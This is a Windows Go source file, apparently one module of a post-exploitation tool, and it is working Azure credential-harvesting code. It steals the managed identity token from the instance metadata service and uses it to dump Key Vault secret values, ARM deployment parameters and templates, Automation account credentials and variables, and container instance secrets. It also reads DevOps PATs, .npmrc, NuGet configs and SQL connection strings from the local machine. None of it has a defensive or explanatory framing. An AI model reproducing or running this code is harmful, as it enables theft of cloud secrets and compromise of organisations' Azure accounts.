//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

// ── Azure Helpers ──────────────────────────────────────────────────────────────

func getAzureAccessToken(client *http.Client) string {
	req, _ := http.NewRequest("GET",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
		nil)
	req.Header.Set("Metadata", "true")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return ""
	}
	body, _ := io.ReadAll(resp.Body)
	var data struct {
		AccessToken string `json:"access_token"`
	}
	if json.Unmarshal(body, &data) != nil {
		return ""
	}
	return data.AccessToken
}

func azureAPICall(accessToken, method, url string) ([]byte, error) {
	req, _ := http.NewRequest(method, url, nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	return body, nil
}

func getAzureSubscriptionID(client *http.Client, token string) string {
	// Get subscription from instance metadata
	req, _ := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
	req.Header.Set("Metadata", "true")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var data map[string]interface{}
	if json.Unmarshal(body, &data) != nil {
		return ""
	}
	if compute, ok := data["compute"].(map[string]interface{}); ok {
		if sub, ok := compute["subscriptionId"].(string); ok {
			return sub
		}
	}
	return ""
}

// ── Key Vault Enumeration ─────────────────────────────────────────────────────

func checkAzureKeyVault(client *http.Client, token, subscriptionID string, r *CloudTokenResult) {
	if subscriptionID == "" {
		r.Metadata["keyvault_error"] = "no subscription ID"
		return
	}

	// List vaults
	url := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01", subscriptionID)
	data, err := azureAPICall(token, "GET", url)
	if err != nil {
		r.Metadata["keyvault_error"] = err.Error()
		return
	}

	var vaultsResult struct {
		Value []struct {
			Name       string `json:"name"`
			ID         string `json:"id"`
			Location   string `json:"location"`
			Properties struct {
				VaultURI string `json:"vaultUri"`
			} `json:"properties"`
		} `json:"value"`
	}
	if json.Unmarshal(data, &vaultsResult) != nil {
		return
	}

	for _, vault := range vaultsResult.Value {
		// List secrets in vault
		secretsURL := fmt.Sprintf("%ssecrets?api-version=7.4", vault.Properties.VaultURI)
		if !strings.HasSuffix(vault.Properties.VaultURI, "/") {
			secretsURL = fmt.Sprintf("%s/secrets?api-version=7.4", vault.Properties.VaultURI)
		}
		secretsData, err := azureAPICall(token, "GET", secretsURL)
		if err != nil {
			continue
		}

		var secretsList struct {
			Value []struct {
				ID   string `json:"id"`
				Name string `json:"name"`
			} `json:"value"`
		}
		if json.Unmarshal(secretsData, &secretsList) != nil {
			continue
		}

		for _, s := range secretsList.Value {
			// Get secret value
			secretURL := fmt.Sprintf("%ssecrets/%s?api-version=7.4", vault.Properties.VaultURI, s.Name)
			if !strings.HasSuffix(vault.Properties.VaultURI, "/") {
				secretURL = fmt.Sprintf("%s/secrets/%s?api-version=7.4", vault.Properties.VaultURI, s.Name)
			}
			secretData, err := azureAPICall(token, "GET", secretURL)
			if err != nil {
				continue
			}

			var secretValue struct {
				Value string `json:"value"`
			}
			if json.Unmarshal(secretData, &secretValue) == nil {
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "azure_keyvault_secret",
					Resource: fmt.Sprintf("keyvault:%s/%s", vault.Name, s.Name),
					Value:    secretValue.Value,
				})
			}
		}
	}
}

// ── ARM Template Credential Extraction ────────────────────────────────────────

func checkAzureARMTemplates(client *http.Client, token, subscriptionID string, r *CloudTokenResult) {
	if subscriptionID == "" {
		return
	}

	// List deployments
	url := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Resources/deployments?api-version=2021-04-01", subscriptionID)
	data, err := azureAPICall(token, "GET", url)
	if err != nil {
		r.Metadata["arm_error"] = err.Error()
		return
	}

	var deployments struct {
		Value []struct {
			Name       string `json:"name"`
			Properties struct {
				Parameters map[string]interface{} `json:"parameters"`
			} `json:"properties"`
		} `json:"value"`
	}
	if json.Unmarshal(data, &deployments) != nil {
		return
	}

	for _, dep := range deployments.Value {
		if dep.Properties.Parameters == nil {
			continue
		}
		for paramName, paramVal := range dep.Properties.Parameters {
			paramLower := strings.ToLower(paramName)
			if strings.Contains(paramLower, "password") ||
				strings.Contains(paramLower, "secret") ||
				strings.Contains(paramLower, "key") ||
				strings.Contains(paramLower, "connectionstring") ||
				strings.Contains(paramLower, "token") {

				// Extract the value
				valMap, ok := paramVal.(map[string]interface{})
				if !ok {
					continue
				}
				if val, ok := valMap["value"]; ok {
					r.Tokens = append(r.Tokens, CloudToken{
						Type:     "azure_arm_param",
						Resource: fmt.Sprintf("arm:%s/%s", dep.Name, paramName),
						Value:    fmt.Sprintf("%s=%v", paramName, val),
					})
				}
			}
		}
	}

	// Also check deployment template export for hardcoded creds
	exportURL := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Resources/deployments?$expand=properties.template&api-version=2021-04-01", subscriptionID)
	tmplData, err := azureAPICall(token, "GET", exportURL)
	if err == nil {
		var tmplResult struct {
			Value []struct {
				Name       string `json:"name"`
				Properties struct {
					Template json.RawMessage `json:"template"`
				} `json:"properties"`
			} `json:"value"`
		}
		if json.Unmarshal(tmplData, &tmplResult) == nil {
			for _, dep := range tmplResult.Value {
				tmplStr := string(dep.Properties.Template)
				tmplLower := strings.ToLower(tmplStr)
				credIndicators := []string{"\"password\"", "\"secret\"", "\"connectionstring\"", "\"primarykey\"", "\"secondarykey\""}
				for _, ind := range credIndicators {
					if strings.Contains(tmplLower, ind) {
						r.Tokens = append(r.Tokens, CloudToken{
							Type:     "azure_arm_template",
							Resource: fmt.Sprintf("arm_template:%s", dep.Name),
							Value:    tmplStr,
						})
						break
					}
				}
			}
		}
	}
}

// ── Automation Account Credential Extraction ──────────────────────────────────

func checkAzureAutomation(client *http.Client, token, subscriptionID string, r *CloudTokenResult) {
	if subscriptionID == "" {
		return
	}

	// List automation accounts
	url := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Automation/automationAccounts?api-version=2022-08-08", subscriptionID)
	data, err := azureAPICall(token, "GET", url)
	if err != nil {
		r.Metadata["automation_error"] = err.Error()
		return
	}

	var accounts struct {
		Value []struct {
			Name     string `json:"name"`
			ID       string `json:"id"`
			Location string `json:"location"`
		} `json:"value"`
	}
	if json.Unmarshal(data, &accounts) != nil {
		return
	}

	for _, acct := range accounts.Value {
		// List credentials in automation account
		credsURL := fmt.Sprintf("%s/credentials?api-version=2022-08-08", acct.ID)
		credsData, err := azureAPICall(token, "GET", credsURL)
		if err != nil {
			continue
		}

		var credsList struct {
			Value []struct {
				Name       string `json:"name"`
				Properties struct {
					UserName string `json:"userName"`
				} `json:"properties"`
			} `json:"value"`
		}
		if json.Unmarshal(credsData, &credsList) != nil {
			continue
		}

		for _, c := range credsList.Value {
			// Get credential value
			credURL := fmt.Sprintf("%s/credentials/%s?api-version=2022-08-08", acct.ID, c.Name)
			credData, err := azureAPICall(token, "GET", credURL)
			if err != nil {
				continue
			}
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "azure_automation_cred",
				Resource: fmt.Sprintf("automation:%s/%s", acct.Name, c.Name),
				Value:    fmt.Sprintf("Username=%s, Raw=%s", c.Properties.UserName, string(credData)),
			})
		}

		// List variables (often contain secrets)
		varsURL := fmt.Sprintf("%s/variables?api-version=2022-08-08", acct.ID)
		varsData, err := azureAPICall(token, "GET", varsURL)
		if err != nil {
			continue
		}
		var varsList struct {
			Value []struct {
				Name       string `json:"name"`
				Properties struct {
					Value  string `json:"value"`
					Type   string `json:"type"`
					Secure bool   `json:"isEncrypted"`
				} `json:"properties"`
			} `json:"value"`
		}
		if json.Unmarshal(varsData, &varsList) == nil {
			for _, v := range varsList.Value {
				if v.Properties.Secure || v.Properties.Value != "" {
					r.Tokens = append(r.Tokens, CloudToken{
						Type:     "azure_automation_variable",
						Resource: fmt.Sprintf("automation:%s/var:%s", acct.Name, v.Name),
						Value:    fmt.Sprintf("Name=%s, Type=%s, Value=%s", v.Name, v.Properties.Type, v.Properties.Value),
					})
				}
			}
		}
	}
}

// ── Container Instance Environment Extraction ─────────────────────────────────

func checkAzureContainerInstances(token, subscriptionID string, r *CloudTokenResult) {
	if subscriptionID == "" {
		return
	}

	url := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.ContainerInstance/containerGroups?api-version=2021-09-01", subscriptionID)
	data, err := azureAPICall(token, "GET", url)
	if err != nil {
		r.Metadata["aci_error"] = err.Error()
		return
	}

	var groups struct {
		Value []struct {
			Name       string `json:"name"`
			Location   string `json:"location"`
			Properties struct {
				Containers []struct {
					Name       string `json:"name"`
					Properties struct {
						EnvironmentVariables []struct {
							Name        string `json:"name"`
							Value       string `json:"value"`
							SecureValue string `json:"secureValue"`
						} `json:"environmentVariables"`
					} `json:"properties"`
				} `json:"containers"`
			} `json:"properties"`
		} `json:"value"`
	}
	if json.Unmarshal(data, &groups) != nil {
		return
	}

	for _, group := range groups.Value {
		for _, container := range group.Properties.Containers {
			for _, env := range container.Properties.EnvironmentVariables {
				val := env.Value
				if env.SecureValue != "" {
					val = env.SecureValue
				}
				if val == "" {
					continue
				}
				if strings.Contains(strings.ToLower(env.Name), "secret") ||
					strings.Contains(strings.ToLower(env.Name), "password") ||
					strings.Contains(strings.ToLower(env.Name), "key") ||
					strings.Contains(strings.ToLower(env.Name), "token") ||
					strings.Contains(strings.ToLower(env.Name), "connection") {
					r.Tokens = append(r.Tokens, CloudToken{
						Type:     "azure_aci_env",
						Resource: fmt.Sprintf("aci:%s/%s", group.Name, container.Name),
						Value:    fmt.Sprintf("%s=%s", env.Name, val),
					})
				}
			}
		}
	}
}

// ── DevOps PAT Token Discovery ────────────────────────────────────────────────

func checkAzureDevOpsPAT(r *CloudTokenResult) {
	// Check common environment variables
	patVars := []string{
		"AZURE_DEVOPS_PAT", "AZURE_DEVOPS_TOKEN", "SYSTEM_ACCESSTOKEN",
		"VSTS_PAT", "AZDO_PAT", "AZURE_PAT",
	}
	for _, v := range patVars {
		if val := os.Getenv(v); val != "" {
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "azure_devops_pat",
				Resource: fmt.Sprintf("env:%s", v),
				Value:    val,
			})
		}
	}

	// Check common config files
	homeDir := os.Getenv("USERPROFILE")
	if homeDir != "" {
		paths := []string{
			homeDir + "\\.azure\\devops.config",
			homeDir + "\\.vsts\\pat.config",
			homeDir + "\\.azure\\azdevops.config",
		}
		for _, p := range paths {
			if data, err := os.ReadFile(p); err == nil {
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "azure_devops_config",
					Resource: p,
					Value:    string(data),
				})
			}
		}

		// Check .npmrc for Azure DevOps registry auth tokens
		npmrcPaths := []string{
			homeDir + "\\.npmrc",
			homeDir + "\\.nuget\\NuGet.config",
		}
		for _, p := range npmrcPaths {
			if data, err := os.ReadFile(p); err == nil {
				content := string(data)
				if strings.Contains(strings.ToLower(content), "pkgs.dev.azure.com") ||
					strings.Contains(strings.ToLower(content), "dev.azure.com") {
					r.Tokens = append(r.Tokens, CloudToken{
						Type:     "azure_npmrc_token",
						Resource: p,
						Value:    content,
					})
				}
			}
		}
	}
}

// ── SQL Connection String Discovery ───────────────────────────────────────────

func checkAzureSQLConnectionStrings(r *CloudTokenResult) {
	// Environment variables
	sqlVars := []string{
		"SQL_CONNECTION_STRING", "SQLAZURECONNECTION_STRING",
		"AZURE_SQL_CONNECTIONSTRING", "SQLAZURECONNSTR",
		"SQL_SERVER_CONNECTION_STRING",
	}
	for _, v := range sqlVars {
		if val := os.Getenv(v); val != "" {
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "azure_sql_connstr",
				Resource: fmt.Sprintf("env:%s", v),
				Value:    val,
			})
		}
	}

	// Check config files for connection strings
	homeDir := os.Getenv("USERPROFILE")
	if homeDir != "" {
		searchPaths := []string{
			homeDir + "\\.azure\\",
			homeDir + "\\.dotnet\\",
			homeDir + "\\AppData\\Roaming\\",
		}
		for _, base := range searchPaths {
			entries, err := os.ReadDir(base)
			if err != nil {
				continue
			}
			for _, entry := range entries {
				if !entry.IsDir() && strings.HasSuffix(strings.ToLower(entry.Name()), ".config") {
					data, err := os.ReadFile(base + entry.Name())
					if err != nil {
						continue
					}
					content := string(data)
					if strings.Contains(strings.ToLower(content), "connectionstring") ||
						strings.Contains(strings.ToLower(content), "server=tcp:") ||
						strings.Contains(content, "Server=.") {
						r.Tokens = append(r.Tokens, CloudToken{
							Type:     "azure_config_connstr",
							Resource: fmt.Sprintf("%s%s", base, entry.Name()),
							Value:    content,
						})
					}
				}
			}
		}
	}
}

// ── Azure Main Entry Point ────────────────────────────────────────────────────

func checkAzureAll(client *http.Client, r *CloudTokenResult) {
	token := getAzureAccessToken(client)
	if token == "" {
		r.Metadata["azure_note"] = "No managed identity token available"
		return
	}

	r.Tokens = append(r.Tokens, CloudToken{
		Type:     "azure_management_token",
		Resource: "management.azure.com",
		Value:    token,
	})

	subscriptionID := getAzureSubscriptionID(client, token)
	if subscriptionID != "" {
		r.AccountID = subscriptionID
	}

	// Run all Azure checks
	checkAzureKeyVault(client, token, subscriptionID, r)
	checkAzureARMTemplates(client, token, subscriptionID, r)
	checkAzureAutomation(client, token, subscriptionID, r)
	checkAzureContainerInstances(token, subscriptionID, r)

	// These don't need the token
	checkAzureDevOpsPAT(r)
	checkAzureSQLConnectionStrings(r)
}
